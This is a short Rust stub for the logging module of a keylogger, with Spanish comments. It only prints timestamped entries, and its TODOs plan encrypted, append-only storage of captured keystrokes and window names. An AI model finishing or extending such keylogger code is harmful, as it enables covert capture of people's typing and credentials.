/*
 Este archivo de log.rs es para manejar la funcionalidad de registro del keylogger.rs, incluyendo la captura de eventos de teclado, la identificación de la ventana activa y el almacenamiento seguro

*/

use chrono::Utc;

pub fn write_log(entry: &str) {
    // TODO: Encriptar entrada antes de escribir
    // TODO: Abrir archivo en modo append
    // TODO: Guardar con formato: timestamp | proceso | texto clasificado

    let now = Utc::now();
    println!("[{}] {}", now, entry); // por ahora solo debug
}
